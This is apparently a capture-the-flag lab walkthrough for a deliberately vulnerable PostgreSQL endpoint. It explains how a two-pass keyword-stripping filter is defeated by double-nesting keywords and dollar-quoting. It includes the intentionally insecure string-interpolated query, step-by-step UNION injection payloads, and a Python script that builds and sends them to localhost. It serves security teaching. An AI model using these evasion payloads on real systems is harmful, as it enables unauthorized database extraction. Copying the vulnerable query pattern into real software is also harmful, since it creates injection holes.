# Level 3-2: WAF Bypass via Keyword Nesting

**URL:** `/waf`

**Objective:** Extract the flag from the `waf_palavras_chave` table by bypassing the custom input filter protecting the endpoint.

## Vulnerable Code

```python
def level3_waf(value: str):
    v = urllib.parse.unquote_plus(value)
    v = unicodedata.normalize('NFKC', v)
    v = re.sub(r'/\*[\s\S]*?\*/', '', v)
    v = re.sub(r'--[^\r\n]*', '', v)
    v = re.sub(r'#[^\r\n]*', '', v)
    v = re.sub(r'[\s\x00-\x1f\x7f]+', ' ', v).strip()
    for ch in ("'", '"', ';', '\\', '`'):
        if ch in v:
            return None
    for _ in range(2):
        for kw in KEYWORDS:
            v = re.sub(re.escape(kw), '', v, flags=re.IGNORECASE)
    return v

query = f"SELECT nome FROM olheiros WHERE nivel = {level3_waf(search)}"
```

> **Note:** This WAF is made up for the lab. Real WAFs (Cloudflare, ModSecurity, AWS WAF) are far more sophisticated, they use heuristics, anomaly scoring, ML models, and behavioural analysis. They will block most automated tools and payloads out of the box. The technique here only works because this filter is a simple regex blocklist running a fixed number of passes.

The filter URL-decodes the input, normalizes unicode, removes comments, normalizes whitespace, blocks dangerous characters (`'`, `"`, `;`, `\`, `` ` ``), and then runs **two passes** of regex keyword stripping against a blocklist (`select`, `union`, `from`, `where`, etc.). The sanitized string is then interpolated directly into the query with no parameterization.

The WAF runs two passes, which defeats single nesting — but **double nesting** survives both:

```
seleseleselectctct
  Pass 1: strip 'select' → seleselectct
  Pass 2: strip 'select' → select  ✓
```

For this WAF (2 passes), nest each keyword twice, splitting it at the midpoint:

| Keyword  | Nested twice (bypass)   |
|----------|-------------------------|
| `union`  | `unununionionion`       |
| `select` | `selselselectectect`    |
| `from`   | `frfrfromomom`          |

### Quote bypass

The WAF blocks single quotes. For any string literals, use PostgreSQL **dollar-quoting**: `$$string$$` instead of `'string'`. Dollar-quoting is not in the blocklist.

## Attack Chain

### Step 1 — Confirm WAF behavior

```
8
```

Returns olheiros with nivel=8. Normal operation.

```sql
0 union select segredo from waf_palavras_chave
```

The WAF strips the keywords and passes a broken string to the query. No result.

### Step 2 — Test single nesting

```sql
-1 uniunionon selselectect segredo frfromom waf_palavras_chave
```

Keywords survive one pass but are stripped on the second. Still fails. Confirms two passes are running.

### Step 3 — Full bypass payload

```sql
-1 unununionionion selselselectectect segredo frfrfromomom waf_palavras_chave
```

After two-pass WAF stripping:

```sql
-1 union select segredo from waf_palavras_chave
```

Full query:

```sql
SELECT nome FROM olheiros WHERE nivel = -1 union select segredo from waf_palavras_chave
```

`nivel = -1` matches no rows. The UNION appends all rows from `waf_palavras_chave.segredo`. The flag appears as a `nome` value in the response.

### Example automation script

File available at: `backend/scripts/script-3_2.py`

```python
import requests

def nest(kw: str, n: int) -> str:
    if n == 0:
        return kw
    mid = len(kw) // 2
    p, s = kw[:mid], kw[mid:]
    inner = nest(kw, n - 1)
    return p + inner + s

PASSES = 2
union  = nest('union',  PASSES)
select = nest('select', PASSES)
frm    = nest('from',   PASSES)

payload = f"-1 {union} {select} segredo {frm} waf_palavras_chave"
r = requests.get('http://localhost/api/waf', params={'search': payload})
print(r.json())
```

```json

```
